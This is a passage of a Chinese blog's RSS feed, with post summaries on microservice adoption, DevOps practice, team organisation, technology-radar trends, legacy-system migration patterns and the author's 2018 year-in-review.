跟踪: 观察系统中的活动并跟踪动作之间的关系。 调试: 与交付流程交互并审查。 指标: 从整个交付流程中的活动中派生指标。 作者：（按照姓名首字母排序）Kenny Bastani, Marc Holmes, Rod Johnson, Jessica Kerr, Mik Kersten, Russ Miles, Erin Schnabel, Matt Stine.</description></item><item><title>微服务演进中的经验和反思</title><link>https://wwww.guyu.me/posts/2019-02-17-rethink-of-microsevice/</link><pubDate>Sun, 17 Feb 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-02-17-rethink-of-microsevice/</guid><description>大部分微服务的案例，我们往往都只能看到一个结果，很难看到其过程，特别是实践中的弯路。让人有一种“采用就会成功的错觉”。经过前三篇的探讨，我们通过一个成功案例的三方面分析对微服务成功度量、技术演进和组织演进有了一个基本的认识。本文试着把我在客户身上看到微服务落地中那些经验和反思分享给大家。
软件开发中的“灰犀牛事件” # “灰犀牛”是与“黑天鹅”相互补足的概念，“灰犀牛事件”是太过于常见以至于人们习以为常的风险，“黑天鹅事件”则是极其罕见的、出乎人们意料的风险。
在产品研发的早期，特别是产品开始投入市场的时候，为了取得短期的高速增长所采用的临时方案。然而，虽然会有资深架构师或者程序员告诉你产品这样做不行。但作为决策层，它并未感到技术债带来的成本和风险（风险和成本的积累是需要时间反应的）。于是技术债就变成了一个“狼来了”的故事，而架构本身就变成了一个灰犀牛事件：
我们从未切实的感到过应用架构崩溃所带来的成本，所以对技术风险选择性失明。
然而，随着资本周转的速度越来越快，这些技术债务的利息会慢慢到期，变成一个又一个定时炸弹。于是应用的交接就变成了一个击鼓传花的游戏。越早构建的应用越能体会这样的痛：
竞争对手的变更越来越频繁，如果不这样很难保持领先优势，因此你也需要更快的交付；
应用质量使得应用交付没有办法快起来；
为了避免质量问题，增加需要采用严格的流程和中间环节审查才能确认变更没有问题；
为了采用严格的流程和中间环节审查，于是应用交付的流程越来越长，导致交付速度进一步变慢；
由于应用交付的流程越来越长，限于交付截止日期。每个人都只关注自己所处的流程，而无法把控整体质量，导致质量进一步变差。
于是，这就变成了一个悖论：你想让软件交付变快的手段只会导致它越来越慢。
对于以上的问题，DevOps 给出了解决方案：通过精益（Lean）缩短流程，通过自动化（Automation）提高效率，通过度量（Measure）看到问题，通过分享/分担（Share）避免只见树木不见森林，通过文化（Culture）一系列的自律自治而非顶层设计产生的原则注入到组织里的每个人身上。这就是 DevOps 的 CLAMS 原则。
然而，DevOps 并没有解决“规模”的问题，它所适用的场景对于“两个披萨”的团队来说如鱼得水。但那些超过“一百个披萨的团队”又应该怎么办？
庆幸的是，在“规模化 DevOps” 出现之前，就有人意识到了 “DevOps 规模化”面对的问题，也避免了那些对“规模化 DevOps ” 避而不谈的尴尬。毕竟，“规模化敏捷”也正处在骑虎难下的境地之中。直到“微服务”吸引了大家的注意力。
我们并没有看到那些技术债，因为工程师们正在承担着技术债的利息。我们也没有看到那些崩溃的应用，因为新的应用会取而代之。那些负责人呢？别担心，也总会有下一个。毕竟所有人都在闭着眼睛扶梯子，而且会有人对你说“你又没站在梯子上，何必认真呢？”
直面风险：关注弹性而非确定性 # 风险管理的本质：不是让所有的风险都消失，而是确保风险发生时有相应的应对措施。 ——《人件》
在打造稳定的应用系统上，人们往往倾向于提升应用系统预期结果的确定性，避免异常情况的出现，这就是让“风险都消失”。这实际上是灰犀牛问题的一种表现：我们选择的不去面对那些一定会发生的风险，而是一厢情愿的避免真实的问题发生。
在这种观念下打造的应用系统会因为僵化而变得更加脆弱，使黑天鹅事件造成的影响更大。然而，如果我们把所有的风险都穷尽，解决这些问题则会花费过多的成本。
我们可以通过事件发生的频率高低和影响大小，构造一个开发-运维事件矩阵。并且监控每个事件对系统造成的影响，如下图所示：
根据上图，通过不断的度量，我们可以看到在微服务的过程中带来的变化。然后，我们可以根据各种事情的变化，构建出一个动态的、可自动恢复的弹性应用系统。
Chaos Engineering——&amp;ldquo;混沌工程&amp;quot;就是一种方法论，能够通过模拟真实发生的风险来验证你的自动化应对措施是否有效。
组织结构上也存在同样的缺乏弹性问题，一个常见的风险就是人员的离职和流动，这是一个常常被忽视的且影响很大的风险。而一个错误的做法是极力挽留一个“重要的人”。
如果一个人离开了造成的很大的影响，凸显出这个人重要性的同时也说明一个组织制度的不成熟。所以，我们要构建一个职责轮换的机制，提升这些事情低频率的发生，并通过组织自发的改进机制来降低它带来的影响。这是我所认为 Design For Failure 的意思：直面风险，而不是选择性失明。
所以你得先看到那些高频率的影响大的事情。去制造它的发生，然后在不断的适应中让他不再那么痛苦。
保持团队信息的极度透明 # 微服务架构实施中一个常见的反模式就是组织和应用的“碎片化”：很多组织在拆分微服务之后，会安排独立的团队负责微服务，并以责任边界隔离代码和团队。
这样会使团队之间从技术到组织流程进入了另一个“深井”。为了解决这个问题，就需要增加了更多的管理人员来解决这些问题。于是一个微服务后的组织被不断的“垫高”。
按照《我们如何衡量一个微服务实施的成功》一文中的度量方式。如果在微服务改进中管理的长期成本提升，往往说明我们走错了路。微服务的实施不能带来信息的垄断和碎片化，反而要提升透明度和统一化。以下两点十分重要：
打破信息的垄断，让所有团队的所有状态和信息——产品路线图、交付进度、运营状态等——对所有团队开放，而不是只存在几个人的手里。
代码全民所有制：团队和微服务不应该是强绑定的关系，用任务类型取代角色。任何人都可以修改任何微服务的代码，每个人对自己的修改负责。
按需拆分微服务 # 很多企业已经在拐点到来之前开始进行微服务改造：引入 Docker、Kubernetes、Kafka……而对于真正的架构问题，大家避而不谈，三缄其口，只把一些时兴的工具祭奠成了玩具。但是，
如果用技术去解决一个管理问题，要么你高估了技术带来的转变，要么你低估了管理问题的难度。
微服务带来的第一个好处就是对风险的隔离：把稳定的部分和不稳定的部分隔离开来。
这种隔离是两个方面的，一方面是一个应用系统运维部分和开发部分的隔离，把经常变动的业务逻辑和不经常变动的业务逻辑执行环境隔离。另一方面就是在应用内部隔离，把稳定的业务和不稳定的业务隔离。
因为微服务本身就是把内部的复杂度，也就是应用内部的依赖。通过分布式工具转化为外部复杂度，也就是应用之间的依赖。所以，需要通过额外的基础设施来管理这些应用之间的依赖。 然而，这样的转换所带来的就是运维成本的上升。
此外，从业务逻辑上“重新拆分”：为了便于理解，进行了更高层的抽象。划分成了“几大中心”，“几大模块”，“各司其职，分别治理”。这满足了决策层“重新画蛋糕”的变革诉求，也很想当然的降低的管理的难度。而习惯于“整体规划”的人往往会从高层设计一个“全局微服务架构”，然而这些设计难以落地，因为高层不理解底层实现。接下来的微服务就会不计成本的落地。一方面为了维护“架构师的尊严”，一方面为了“缩短时间成本”。然而，这些都美好的愿望、经常碰到几个问题：
理想的架构和现实的架构差异很大，因为很多实现的问题在设计的时候并没有考虑；
服务拆分后每人只关注自己的服务，缺失的服务间业务设计则需要增加管理层来弥补；
自动化不足，需要更多的人员来解决工作量；
急功近利面对太多的未知引发风险和成本的规模性增长；</description></item><item><title>迟到的 2018 年终总结</title><link>https://wwww.guyu.me/posts/2019-01-07-annual-review-for-2018/</link><pubDate>Mon, 07 Jan 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-01-07-annual-review-for-2018/</guid><description>2018年12月31日 23点50分，我把最后一篇稿件发到 GitChat 上之后，我合上了电脑，准备入睡。这是我 2018 年的个人看板上的倒数第二件事。最后一件事就是这一篇年终总结。受“蔡加尼克效应”的影响，2018年1月1日开始，除了工作时间，剩下的一周所有我都在构思这篇年终总结该如何写。然而，几次起笔和修改都不能让我满意。
简单总结如下：
2018 年的产出 # 2018 年参加了大大小小的分享共计12场，北京、上海和深圳，平均每月一场，详情见：https://wizardbyron.github.io/slides/，PPT 都可以免费下载。
发表了 15 万字，共计 24 篇，平均每月1篇5000字左右文章，大部分都在简书和 GitChat
自己研发了三个线下课程：AWS 架构实战工作坊、持续交付、微服务。从敏捷，到持续交付，到 DevOps，再到微服务。我计划 2019 年丰富这些线下课程。
两个在线课程：DevOps 落地实战、DevOps 从入门到精通（ThoughtWorks 社区），翻新 DevOps 转型实战课程，增加更细致的案例和动手实践，内容会比以前丰富 5 倍左右。
参与编写两个标准：DevOps 标准、微服务标准。都还是征求意见稿，2019年将继续完善。
开发了两个开源软件，2019年要继续完善，0.1.0 Release
vivian，详见测试驱动开发 Nginx 配置
wade，详见一怒之下，我写了一个开源流量测试工具
其次是一点感想 # 有产品要学做产品经理，没有产品要创造产品做产品经理。我拿自己的产出作为试验田，开始习练我之前学习过的理论。
2018 年初调整了年初的个人商业模式画布，拓展了渠道并加深了合作。丰富了产品类型：从文章、到视频课程，从大会分享到线下课程。这样可以接触更多的客户和用户，进一步了解市场的信息。所以我重新调整了2018的关注点，收效不错。从 2018 年的反馈来看，2019 年需要更新自己的产品线：DevOps、微服务和云计算。
2018 年重新开通了博客，并把自己过去在简书上写的文章迁移到博客上来。我的博客经历了三次删除（找不到它存在的必要性），终究还是找到它存在的意义了。
这么多的产出，对于我的意义其实更大。如果你是新入职场的毕业生，建议你立刻养成这样的习惯：将自己的项目和职业生涯积累在一个 PPT 上，这个 PPT 是你整个职业生涯和你自身思想的积累，它会指引你未来的方向，它是你无可取代的核心竞争力。在不断完善它的路上，你也更加完善你自己，换句话说，它是你认识自己价值的最好方式，它能帮你从一而终，能给你方向。很遗憾在自己工作的第十个年头才开始打造自己。不过，任何开始都不会太晚。通过2018年，我更体会到了它的价值，任何时候都有有准备好的材料和他人交流。2019年我仍将继续。
2018 年开通了公众号，但终究没有好好运营。公众号是一个比其它渠道更直接的交流方式，2019 年我将好好运营它。
从 2017 年开始，我开始采用 Trello 跟踪我自己的事务，一直很难做到 WIP = 1 和按时完成。但实际上，我的产量比2017年翻了一倍。
2018 年我离开了 ThoughtWorks，这是一个看似必然但是很偶然的决定。必然的是我发现自己没有办法突破自己的瓶颈期。偶然是因为在我不期而遇的生活变故上带来的一些雪中送炭。可惜的是，我依旧没有给自己的剧本演好一个结局：AWS 的课程 和 DevOps 的课程没有完成，自己跟踪了一年多的项目在上线阶段离开。
写到这，就这样吧~ 它不再烦我了。</description></item><item><title>成功微服务实施的组织演进</title><link>https://wwww.guyu.me/posts/2018-12-24-microservices-org-evo/</link><pubDate>Wed, 26 Dec 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-12-24-microservices-org-evo/</guid><description>在 成功微服务实施的技术演进里我们介绍了案例中微服务架构演进的技术背景，本文介绍一下这期间发生的组织演进。可以说，一个合适的组织结构是驱动微服务架构成功落地的必要能力。
在我们如何衡量微服务实施的成功里面，我们介绍到系统的规模会因为维护成本达到极限。这个维护成本中最主要的一个部分就是人员成本和管理成本。而在这个案例里，我们可以看到两个特征：管理层的缩减和生产力的提升。
微服务开发团队的演化过程 # 在最开始的时候，我们的产品分为两类团队，如下图所示：
一类是维护现有产品的团队，我们称之为“BAU （Business As Usual）团队”。这样一个团队用来修复 Bug、清理技术债、并对生产需求快速响应，有时候也做一些小于一个迭代（2周）的需求。可以说是一些重要又紧急的事情。在代码库上负责对代码主干和hotfix（快速修复）分支进行更改。
另一类团队是功能团队，又称特性团队。这样的团队有多个，都是按照不同的新特性和新需求组建的团队。团队大小根据需求的规模和项目的周期决定。每个团队都有一个特性分支，这个特性分支采用单主干开发。在开发的过程中会每天把master 分支合并到自己的分支上，以降低未来合并的痛苦。
待特性开发团队完成了一个项目或者一个特性的开发后，代码合并到主干，开始进行1~3个月的维护期，这个期间特性团队解散并入BAU团队。而之前 BAU 团队的成员开始准备成立新的特性开发团队了。
由于代码是“全民所有制”，每个人都会对所有的代码质量负责，而不是自己负责的那一小块。而且每个团队在 BAU 项目上工作的时候，可以学习到完整的业务知识和开发实践。因此 BAU 团队也适合培养刚加入团队的新人。
在这样不断的轮换过程中，每个人都学习到了整个代码库的业务知识，也参与了新特性的开发。
微服务团队就来自于这样一个特性团队：我们需要为新的微服务新建一个代码库。也需要在原先的代码库上通过创建新的分支来进行修改，把微服务集成到老的系统上去。当微服务部署好之后，新的分支就会被合并到主干，部署后和微服务集成。
后来，随着需要微服务化改造的系统越来越多，会慢慢演变成下图的样子：
从宏观上来看，一个企业为了满足各个方面的信息化需求，一定会有很多不同的应用系统。比如财务、人员管理、产品管理、工作流程等。等发展到了一定阶段一定会需要通过技术手段将不同的系统实现数据共享。我们会采用系统集成技术来集成不同的系统，把所有的系统都整合到一起。这里就涉及到了两个问题：
一个是“Single source of truth”，也就是单一事实来源。我们希望在多系统集成的情况下，某一种数据，例如客户信息、价格，等都有单一的事实来源。否则在不同子系统之间出现数据不一致的情况。
另外一个就是之前提到的 Design For Failure，在业务正在运行的期间，应用系统的改造不能使当前业务崩溃。因此，我们的任何一个决策都要保持现有业务运行的稳定，一方面是人员组织，另一方面是系统架构。
图里三个颜色表示三个业务系统，三个业务系统最开始只有 Team A 是做微服务的，它只做一个应用的一小部分，比如 APP-1 的其中一个微服务。而其它的团队还在维护各自的单体应用。他们把所有应用业务切分成不同的微服务并集成，花了三到五年的时间。他们的团队所面对的维护工作量看起更大的了，因为他们需要关注的点更多了，但是它的团队没有增加反而减少了。某些团队被拆散，和其他的团队整合。或者开发了新的业务部门。
之前在这个公司里面一共有120个开发人员在维护这些系统，包括我们这边和客户那边的，到现在只剩80个人了。过去四年到五年有将近 30% 的人离职去搞比特币或者区块链创业了，当然还有人补充进来。
然而他们的系统并没有因为要维护这么多模块垮掉，而是这么多人已经足够多了。一开始我们是有运维团队的，第一个微服务团队和这个团队是一起工作的。到后面它又不再去到每一个团队工作了，而是形成一个运维模式，这个团队就是之前文章提到过的“熊猫团队”（PandA，Platform AND Architecture 平台和架构团队）。
微服务的团队大小的原则 # 多大的微服务团队是合适的？下面是我们微服务团队的照片，亚马逊提出两个披萨饼的团队。我们也采用过两个必胜客披萨的团队，但我们发现两个披萨的团队不符合实际。是因为你所碰到微服务的粒度是不一样大的。
因此，我们组建了“两个桌子间”的团队，如下图所示：
团队的规模决定了两件事：沟通的成本和微服务的大小
这两个条件一个决定了团队规模的上限，一个该决定了团队规模的上限。所谓“两个披萨的团队”事实上约束了团队的成本，同样也约束了微服务的规模。如果团队面对的代码库觉得力不从心，你就得缩减一下微服务的规模直到团队能够独立维护这个微服务。如果很多人都空闲，你可以让团队承担多一点代码。
这张照片是我们的一个微服务团队大概的规模：两个桌子背对背的空间，最大不超过16个人。
这样的一个空间形成了一个天然的场地：显示器是天然的屏障，你需要转过身来面对大家而不是坐在显示器背后。这样人和人之间不存在阻碍，也没有了秘密。这恰恰是一个团队理想的开会场所，我们在这里开站立会议，并且在一头设置了物理的看板墙，这样团队可以对当前的工作一目了然。
我们决定微服务团队的大小有三个原则：
团队的成员相互之间可以随时沟通：两个桌子之间的空地就是我们的会议室，有事随时沟通，同时也不会被隔壁桌子打扰。 不增加额外的管理成本：无需增加管理团队来管理微服务团队，微服务团队的工作责任边界完全自治。 不需要加班即可完成计划的任务：表明当前的工作量对于团队成员来说是合适的。 如果大于这个尺寸，证明你的微服务团队过大，需要进一步拆分。遇之相对应的是你的微服务的开发维护工作量过大，也需要进一步拆分。团队的最好的大小是和微服务的工作量是一致的。
如果小于这个尺寸，会因为微服务拆分的过小反而增加管理成本。你会发现有很多的团队需要协调，不得不增加协调人员来协调各微服务之间的工作，这就是额外的微服务团队管理成本。
当然，你可以拥有“两辆轿车”的团队或者“一个大圆桌团队：团队所有人出去吃饭刚好可以坐下两辆轿车，或者可以坐下一个包厢的圆桌。主要还是为了降低团队沟通和决策的成本，增加团队凝聚力。
从工作量的角度来看，每天的工作量要达到75%以上的时间利用率。也就是说，如果是“朝九晚六”（9:00-18:00）的工作方式，除去午休的一个小时。全天有8个小时的工作时间，起码要保证至少 6 个小时是在微服务的工作上。可以有2个小时左右的时间处理私人和组织的事务。如果微服务团队内部的工作时间小于这个比例，那么就证明组织之间存在额外的沟通成本，这些沟通就是需要被拆分出来的依赖，或者被下放的责任。
微服务团队中的角色分工 # 作为一个微服务团队组织是什么样的呢？我们的微服务团队是一个全功能的敏捷团队。这样的一个团队除了满足以上的团队大小外，还需要满足“全功能”和“敏捷”两个条件。
首先，我们是一个全功能的团队，也就意味着我们的团队可以处理整个团队端到端的所有任务，而无需依赖其它团队。这就保证了团队的自治。
其次，我们是一个敏捷团队，采用敏捷方法论和实践指导微服务的实践。
我们的角色分工是这样的：
一名微服务的负责人。这样的团队我们又叫项目经理（PM），又叫MS-MASTER，它是一个复合的角色，不光是经理还是架构师是技术角色。帮我们隔离外部的干扰，例如会议、沟通等……以确保团队可以独立的工作。
一名业务分析师（BA），而发现需要这么一个角色的过程是经历过惨痛教训的：如果你的团队没有人十分熟悉业务流程和组织结构，划分出来的微服务就会和别的团队有重复。这就违反了单一事实来源的原则，而提前的分析可以避免这一点。而团队内部大部分是开发工程师，两个到14个不等。当然，这样的一名业务分析师可以多个团队共享。不过刚开始的时候，建议一个微服务团队有一个专门的业务分析师和领域专家共同合作。
一名质量分析师（QA），我们的 QA 不仅仅是做测试的，我们的 QA 还要理解业务，而 QA 是做全流程的质量保障。我们的测试流程是开发工程师写的自动化测试。注意，由于微服务的抛弃成本很低，我们并没有很高的单元测试覆盖率，但是我们要确保对应的端到端测试和集成测试都是大部分被覆盖的。另外我们需要运维工程师来帮我们设计持续部署和在线微服务的监控。此外，由于QA熟悉业务，某种程度上可以替代 BA 的职责。
一名运维工程师（Ops），帮我们构建基础设施平台并做好配置，以便我们快速部署微服务。这样当需要运维支持的时候，我们就不需要依赖运维团队了。这样一个角色可以是多个团队共有的，它可以在多个团队中寻找一些模式来构建微服务平台或者工具。
一名技术负责人（Tech Lead），主要负责架构和技术选型，指导其它开发者的开发，某种程度上是可以作为 Ops 。
若干个开发者（Dev），完成微服务的开发。需要注意的是，这样一个团队包括前端工程师和后端工程师，而不仅仅是前端工程师。</description></item><item><title>从第19期技术雷达看 DevOps 的发展趋势</title><link>https://wwww.guyu.me/posts/2018-12-10-devops-trend-from-tech-radar-vol19/</link><pubDate>Mon, 10 Dec 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-12-10-devops-trend-from-tech-radar-vol19/</guid><description>2018年下半年的技术雷达发布了。看过的朋友可能和我的感觉一样，会发现大部分条目都是和微服务和 DevOps 相关，但这些条目散落在不同的象限里。本文将这些散落在不同象限的条目采用以下 5 个主题进行重组：
DevOps 合作新实践 云计算新实践 容器新技术 微服务及其误区 安全 特别要提出的是，这期技术雷达采纳了 2018 年的 DevOps 报告 中的四个关键指标(FOUR KEYMETRICS):前置时间，部署频率，平均恢复时间(MTTR)和变更失败百分比。而这四个关键指标也是业界度量 DevOps 效果的统一方式。
每个指标都创造了一个良性循环，并使团队专注于持续改进:缩短交付周期，减少浪费的活动，从而使你可以更频繁地部署，进而改进他们的实践和自动化流程。通过更好的实践，自动化和监控可以提高你从故障中恢复的速度，从而降低故障频率。
DevOps 的合作 # 如何更好的在组织内合作是 DevOps 实践中永恒不变的的话题。随着 DevOps 合作理念的深入，合作的范围越来越越广，随之带来了新的问题和挑战。这期的技术雷达介绍了以下几方面的合作：
和外包团队/供应商的 DevOps 合作 和用户/客户/UX设计师的合作 分布式团队之间的合作 和外包团队的 DevOps 合作 # 而随着 DevOps 应用的加深，会不可避免的碰到组织结构上带来的问题。特别是和外包方的合作，会影响组织的 DevOps 表现。这样的合作往往充满了漫长繁冗且火药味十足的会议和合同谈判，这是 DevOps 运动中不希望看到的但是又无法避免的问题。在 2018 年的 DevOps 报告中看到外包会带来效能下降——“低效能团队将整部分职能进行外包的可能性几乎是高效能团队的 4 倍，这些 外包功能包括测试或运维等等。”
看到这里，千万不要得出“不要用外包的结论”。这里说得是不要“职能的外包”，而“端到端的外包”（End-2-End OutSourcing）则会免除这种顾虑。很多业界一流的 IT 服务企业都提供端到端的 IT 外包服务，你只需要告诉它们你要DevOps，它们会用最有效的方式交付给你。与供应商一起增量交付(INCREMENTAL DELIVERY WITH COTS (commercial off-the-shelf)) 就是这期技术雷达中提出的和外包商一起进行 DevOps 策略之一。与供应商的做端到端的 DevOps 性质的外包另外一个优点则是这样的供应商适合做“长期合作伙伴”来补充你业务、IT 等多样性的不足，甚至能够帮你培训员工。
而随着组织开始采用四个关键指标，这对对供应商的要求也越来越高，但盈利空间相对越来越小。和任何行业一样，成本的降低和效率的提升永远是不变的主节奏。外包也要提升自己的能力水平以跟上技术发展的节奏，这是不可避免的成本。
但是，和外包方的合作仍然是在 DevOps 转型过程中不可避免的痛苦，可以采用一些方式减轻这种痛苦。例如这期技术雷达中介绍的**“风险相称的供应商策略(RISK-COMMENSURATE VENDOR STRATEGY) ”**，它鼓励在高度关键系统中维持其供应商的独立性。而那些相对不太重要的业务可以利用供应商提供的成熟解决方案，这可以让企业更容易承受失去该供应商所带来的影响。这不光是说 IT 产品供应商，同样也指的 IT 服务供应商。
“边界购买（BOUNDED BUY）”就是这样一种实践，在采购产品中即只选择模块化、解耦的，且 只包含于单一业务能力(Business Capability)的限界上下文(Bounded Context)中的厂商产品。应该将这种对 模块化和独立交付能力的要求，加入对供应商选择的验收标准中去。也可以将一小部分业务的端到端维护外包出去，在获得灵活性的同时，又获得高效。
和 UI 的合作 ——DesignOps # DevOps 的目标就是尽可能的缩短最终用户想法到代码之间的距离，避免传递过程中的信息失真。特别是用户的反馈，于是有了 DesignOps 实践。这个领域的实践和工具也日渐成熟。这期的技术雷达介绍的一整套支持 UI 的开发环境(也称为UI DEV ENVIRONMENTS)专注于用户体验设计人员与开发人员之间的协作，例如 :Storybook ，react-styleguidist，Compositor 及 MDX。这些工具大部分围绕 React 的生态圈产生。既可以在组件库或设计系统的开发过程中单独使用，也可以嵌入到 Web应用项目中使用。</description></item><item><title>成功微服务实施的技术演进</title><link>https://wwww.guyu.me/posts/2018-12-08-microservices-tech-evo/</link><pubDate>Sat, 08 Dec 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-12-08-microservices-tech-evo/</guid><description>在上一篇文章《我们如何衡量一个微服务实施的成功》里，我们介绍了衡量一个微服务改造成功的七个特征，分别是：
很多个代码库，以及一一对应的流水线。 应用可以随时部署，并不需要等待。 大量的自动化测试。 更少的变更事故。 更低的发布风险。 可以按需扩展。 更多的自动化手段。 而本篇文章所介绍的案例，也符合这篇文章中对“微服务实施成功”的定义。不过，我们将通过以下五个方面来介绍我们是如何做到达到这七点的：
通过度量驱动架构的微服务化； 微服务平台的演进； 数据库的独立演进； 服务间的轻量级通信； 微服务的全链路跟踪； 微服务演进的技术背景 # 2013年，当我加入这个“微服务改造”项目中的时候，微服务远没有像今天这么火。那个时候我还不知道这种架构演进的方式叫做“微服务”。直到我离开这个项目把其中的经验带到其它项目里，才对敏捷，DevOps和微服务有了进一步的认识。
当时，我们刚刚协助客户把应用程序从自建数据中心迁移到亚马逊云计算服务（AWS）上，并通过 DevOps 等实践做到了按月发布。然而，新的挑战接踵而至。当客户决定开始做微服务之前，遇到了以下三点问题：
运维风险高，发布的时候需要整体发布。除了累积了应用变更以外，还有基础设施的变更。 开发效率低，由于单体应用存储在一个代码库里。导致各功能，项目，维护团队之间产生依赖，交付效率很低。 内部多个应用系统之间需要集成，但缺乏单一可信数据源（Single Source of Truth）。 作为很早就采用敏捷方式开发的企业来说，该企业很多敏捷实践都做的非常成熟，并往往作为澳大利亚敏捷成功的案例标杆。在我加入的时候，客户已经采用持续集成很长时间了。而迁移到 AWS，还需要将部署和运维部分自动化，从技术层面为 DevOps 做了很好的准备。那时候我们所依赖的仍然是用 Chef 去构建自动化的脚本进行部署，并开始采用 Ansible 这种技术做发布的标准化。
通过度量驱动架构的微服务化 # 我们所拥有的是一个基于 Spring 2.5 的 Java 遗留系统，各个系统之间由 ESB （Enterprise Service Bus 企业服务总线）串联起来。多个不同的业务线（Line of Business，LoB）拥有各自独立的产品组件，但都是基于同一套代码库。
这样的痛点很明显：
每个业务线都要有自己的子产品，但大家都基于同一份代码库。 每个业务线对自己产品的改动，会影响到其它的系统。 由于不同的系统的组件依赖于不同的环境和不同的数据库，所以部署所带来的风险很高。 随着开发人员的不断增加，以上的痛点越来越明显，我们发现很多工作因为开发阻塞而无法前行。于是就有了一个最基础的度量：发布阻塞时间。
当我们把敏捷看板构建起来，我们可以很清楚的看到需求分析、开发、测试的各环节时间。当时并没有采用 DevOps，我们的持续发布也仅限于 Staging（准生产环境），而各个环节内可以采用更具有生产力的实践我们可以缩短环节时间，降低浪费。但，阻塞时间则随着需求的增加而增加。
当阻塞时间在上涨的时候，主观的组织规划已经和应用系统规划不符了。于是，产品则根据业务线被划分成了三个产品，如下图所示：
于是有了三个代码库，和三条不同的流水线。每个业务线都负责构建自己的代码库和周边生态。这样虽然会带来代码的重复，让很多有 DRY（Don&amp;rsquo;t Repeat Yourself ）癖的架构师难以接受。但毕竟各产品未来要走自己的路，因此，为了让各业务线不阻塞，各自采用各自的代码库进行发布。于是原先的团队随着代码库的分离而分隔成了不同的团队。但是，Ops 团队却没有分隔开，而是作为通用能力继续支持着各产品线的发展。
这也就是康威定律所说的：“设计系统的组织，其产生的设计等同于组织之内、组织之间的沟通结构。”
这一次的拆分尝到了甜头，除了各个业务线开发阻塞时间缩短以外，各个业务线的产品的发布失败率和故障率也降低了。于是我们继续采用工具提升发布的成功率和效率，直到我们发现我们系统里的 ESB 成为了我们的瓶颈。于是我们开始进行了微服务的拆分。
我们预期的策略是采用“拆迁者模式”：即新建一套子系统，再统一的进行迁移，一步到位。能够这样做的前提是要有足够的自动化测试覆盖当前所有的业务场景。于是我们根据我们需要拆分的功能先编写自动化测试，在自动化测试通过的情况下可以保障我新编写的代码不会影响现有的功能，包括数据迁移后的测试。
然而，拆迁者模式最大的挑战来自于切换风险，为了避免切换造成的风险就要补全自动化测试，这样的成本是巨大的。除非很早就开始做好了责任独立的设计。否则，不要用拆迁者模式。
另外两种模式就是“绞杀者模式”和“修缮者模式”。前者有一个别名，叫做“停止挖坑”，意思就是不要在当前的系统里继续增加功能，而是采用松耦合的方式增加新的功能，使得老的功能慢慢被绞杀掉。这种模式的前提就是要确认遗留系统不再进行功能新增，只做 Bug 修复和例行维护。这样带来的变更风险最小，但演进时间较长。对于“新遗留系统”——刚刚开始转入维护不到半年的新系统，可以采用这种方式。
然而，我们所碰到的应用系统则是一堆运行时间超过5年的遗留系统。于是我们采用了“修缮者模式”。修缮者模式源于古老的软件工程格言：“任何问题都可以通过增加一个中间层解决”。
我们首先做了一个前后端分离，采用 RESTful API 作为后台，向 PC 浏览器和手机 App 提供数据交互。这样，无需为移动应用单独编写后台应用，只需要复用之前写好的 API 就可以了。这就是当前很多应用进行微服务改造的第一步。
到了后期，我们发现有些需要很多 API 需要进行转化，所以我们当时做了一个叫做 Syndication API 的东西，它实际上一个一个 API 的集合。通过反向代理重新暴露后端的数据和接口。这当时是为了能够给 Mobile 端提供数据所准备的过度方案。所以我们采用了 Ruby 这种可以快速开发的语言（讲真，Ruby 开发的项目都不大好维护，一部分原因是 Ruby 程序员水平差异太大，另一部分原因是 Ruby 版本和各组件更新的问题）。后来我们发现，完成一个功能需要给 Web 和 Mobile 端做重复的开发。所以，我们决定在前后端分离的基础上逐渐替换掉老的 Web 应用，即便它运行的很稳定。</description></item><item><title>我们如何衡量微服务的成功？</title><link>https://wwww.guyu.me/posts/2018-11-08-how-do-we-measure-microservices-success/</link><pubDate>Thu, 08 Nov 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-11-08-how-do-we-measure-microservices-success/</guid><description>4 月在深圳的 GOPS 大会上我分享了“落地微服务的难点和如何高效落地微服务”，这是我 2017 年 4 月份开始做的项目总结，后来发表到了自己的博客和&amp;quot; ThoughtWorks 洞见&amp;quot; 上。
本次介绍的案例来自于我 2013 年刚加入 ThoughtWorks 所服务的客户 R，到今天已经5年整了。2013年的国庆后，我加入了客户 R 的其中一个产品团队，这个团队有三个项目：一个项目做日常维护工作（BAU），这是一个长期项目。一个项目开发一些新的功能。另外一个项目就是将现有的 Java 遗留系统进行改造，把这个 Java 应用的一部分功能从 ESB 和内部调用的方式改成用 Sinatra (Ruby 的一个 Restful API 框架) 做的 HTTP 外部调用。
当时我还不知道我们做的东西就是微服务，只是觉得通过自动化测试和持续交付的方式把应用进行了低风险的解耦。降低了系统的复杂性，减少了需要维护代码，也使得在这个代码库上工作的其它团队不受阻碍。同时减少了生产环境的故障和发布风险。
我在这个项目上工作了 8 个月，完成了“一块功能”的拆分。当时我们并没有一个独立的 Ops 团队，所有的运维相关工作都是团队内自己完成的，那时候我们也不区分开发、测试、运维。只是不同的人去认领不同的任务，不会的就现学现用，或者请教Ops 团队。这就是我最早接触的 DevOps ：一个全功能的端到端产品团队。
在 2014 年的时候我们采用 Docker 进行部署，Docker 在当时是个很新颖的东西，所以互联网上相关的材料并不多。于是我们就自己写了一些编排工具来做 Docker 的大规模部署。同一时期，我们接触到了契约测试，并把契约测试应用于我们的微服务上面。并开始使用 Scala 和 Play 框架拆分另外的应用。通过契约测试，我们会把串行的集成测试转化为一些单元测试。由于契约的约束，使得集成测试降级成为了单元测试，大大提升了测试的效率，降低了测试的成本。
你会在各种微服务的书和相关实践中都能看到 Pact 这个工具，这是客户 R 的另外一个顾问公司开发的，也是他们定义了什么叫契约测试。到了2014年底我们把几个接口拆分出来之后，我才知道这是微服务，也理解了什么是 DevOps。
2014 年 11月份我离开了这个团队，开始把在这个团队上的经验推广给不同的客户，才慢慢深入了解了 DevOps 和微服务的概念。同时，客户 R 也开始复制我们之前的成功经验，开始在整个集团内部进行了全面的微服务化改造。
2017 年 4 月份我重新回到这个客户的项目上工作到 2018 年的 9 月份，期间和其它做微服务的团队进行了一些访谈，可以从比较直观的角度来观察这 5 年来微服务改进的效果和经验。
